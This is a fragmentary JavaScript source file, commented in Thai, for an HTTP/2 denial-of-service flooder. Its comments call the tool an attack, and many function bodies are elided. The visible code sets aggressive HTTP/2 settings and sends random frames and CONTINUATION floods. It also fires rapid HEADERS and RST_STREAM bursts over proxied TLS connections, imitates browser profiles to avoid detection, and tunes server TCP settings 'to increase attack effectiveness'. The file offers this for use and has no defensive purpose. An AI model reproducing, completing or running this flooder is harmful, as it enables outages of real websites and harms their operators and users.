...
// ฟังก์ชันสำหรับสร้าง random string
...
// ใช้ฟังก์ชัน randstr ที่ประกาศไว้ด้านบนแล้ว

// รวมการตั้งค่า HTTP/2 ทั้งหมดให้เหมาะกับทุกเป้าหมาย
function getHttp2Settings() {
    // ตั้งค่าเริ่มต้นให้มีความก้าวร้าวพอสมควร
    const baseSettings = {
        [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
        [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 1000,
        [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 6291456 * 2, // เพิ่มขึ้นเป็น 2 เท่า
        [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 524288, // ใช้ค่าสูงสุดที่เคยกำหนดให้ Akamai
        [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384 * 2, // เพิ่มขึ้นเป็น 2 เท่า
        [HTTP2_SETTINGS.ENABLE_PUSH]: 0
    };
    
    // สุ่มปรับค่าบางส่วนเพื่อความหลากหลาย
    if (Math.random() > 0.5) {
...
// รวมการสร้าง Path ทั้งหมดให้เหมาะกับทุกเป้าหมาย
...
// ปรับปรุงฟังก์ชัน sendRandomFrames ให้มีการตรวจสอบสถานะการเชื่อมต่อ และลดการส่งซ้อนกัน
function sendRandomFrames(client, streamId, rate) {
    // ตรวจสอบว่า client พร้อมใช้งานหรือไม่
    if (!client || client.destroyed) return;

    // ลดจำนวน frames ที่ส่งลงเพื่อลดโอกาสที่จะเกิดปัญหา
    const safeRate = Math.min(rate, 10); // จำกัดจำนวนสูงสุดที่ 10
    
    // สร้างรายการ frames ที่จะส่งแทนการส่งทันที
    const framesToSend = [];
    
    for (let i = 0; i < safeRate; i++) {
        // สุ่มประเภทเฟรมที่จะส่ง
        const frameTypes = [
        ...
        if (frameType === HTTP2_FRAME_TYPES.WINDOW_UPDATE) {
            ...
            // ไม่ต้องส่ง PRIORITY frames ตรงๆ เพราะอาจทำให้เกิดปัญหา
            // แทนที่จะใช้ client.priority() ถ้ามี
    ...
    // ส่ง frames ที่เตรียมไว้แบบมีระยะห่าง เพื่อลดการแย่งกันใช้ทรัพยากร
    let delayIndex = 0;
    for (const frame of framesToSend) {
        ...
        }, delayIndex * 5); // เพิ่มระยะห่างระหว่างการส่งแต่ละเฟรม
        delayIndex++;
    }
}
...
// ปรับปรุงฟังก์ชัน sendContinuationFlood เพื่อไม่ให้ใช้ API ภายในโดยตรง
function sendContinuationFlood(client, streamId, count = 50, browserType = 'chrome') {
    // ตรวจสอบว่า client พร้อมใช้งานหรือไม่
    if (!client || client.destroyed) return;
    
    try {
        // จำกัดจำนวน frames ที่จะส่งเพื่อลดโอกาสที่จะเกิดปัญหา
        const safeCount = Math.min(count, 20);
        
        // สร้าง request ด้วย headers ที่มีขนาดใหญ่พอสมควร
        const largeHeaders = {};
        const browserProfile = BROWSER_PROFILES[browserType] || BROWSER_PROFILES.chrome;
        
        // ใช้ headers จาก browser profile
        ...
        // เพิ่ม custom headers เพื่อทำให้ขนาด header block ใหญ่ขึ้น
        for (let i = 0; i < 5; i++) {
            largeHeaders[`x-custom-header-${i}`] = randstr(Math.floor(Math.random() * 256) + 64);
        }
        
        // สร้าง request ด้วย headers ที่มีขนาดใหญ่
        const request = client.request(largeHeaders, { endStream: false });
        
        // ส่ง DATA frames เพื่อสร้าง traffic มากขึ้น
        for (let i = 0; i < safeCount; i++) {
            setTimeout(() => {
                try {
                    ...
                    // ถ้าเป็น frame สุดท้าย ให้ปิด request
                    if (i === safeCount - 1) {
                        request.end();
                    }
                } catch (e) {
            ...
            }, i * 10); // ส่งแต่ละ frame ห่างกัน 10ms
        }
    } catch (error) {
        // จัดการข้อผิดพลาดเงียบๆ
    }
...
// ใช้ทุกรูปแบบการโจมตี โดยไม่สนใจประเภทเป้าหมาย
function getAttackStrategy() {
    // สุ่มกลยุทธ์จากทั้งหมดที่มี
    const strategies = [
    ...
    // สุ่มเลือกหนึ่งกลยุทธ์
    return randomElement(strategies);
}

// ฟังก์ชันสำหรับสร้าง HTTP/2 frames โดยตรง
...
// แก้ไขฟังก์ชัน runFlooder เพื่อแยกการใช้ HPACK กับ HTTP/2 API
function runFlooder() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        // ตัดสินใจใช้ HPACK โดยตรงหรือใช้ HTTP/2 API - ไม่ใช้ทั้งสองวิธีพร้อมกัน
        const useHpackDirectly = Math.random() > 0.7; // 30% โอกาสในการใช้ HPACK โดยตรง
        ...
        if (useHpackDirectly) {
            ...
            tlsConn.on('connect', () => {
                ...
                const attackInterval = setInterval(() => {
                    ...
                    try {
                        for (let i = 0; i < args.Rate; i++) {
                            // เพิ่ม stream ID ทีละ 2 ตามมาตรฐาน HTTP/2
                            streamIdCounter += 2;
                            ...
                            // สร้างและส่ง HEADERS frame
                            const headersFrame = createHeadersFrame(streamIdCounter, headersList, codec);
                            tlsConn.write(headersFrame);
                            
                            // สุ่มส่ง RST_STREAM หลังจากส่ง HEADERS (สามารถทำได้เพราะไม่ได้ใช้ HTTP/2 API)
                            if (Math.random() > 0.7) {
                                // หน่วงเวลาเล็กน้อยเพื่อไม่ให้ส่งพร้อมกัน
                                setTimeout(() => {
                                    if (!tlsConn.destroyed) {
                ...
                // ปิดการเชื่อมต่อหลังจากเวลาที่กำหนด
                setTimeout(() => {
                    clearInterval(attackInterval);
...
// ฟังก์ชันสำหรับปรับแต่งค่า TCP เพื่อเพิ่มประสิทธิภาพการโจมตี
function TCP_CHANGES_SERVER() {
    // ตรวจสอบระบบปฏิบัติการก่อนเรียกใช้คำสั่ง
    const platform = os.platform();
    
    // ทำงานเฉพาะบน Linux เท่านั้น
    if (platform !== 'linux') {
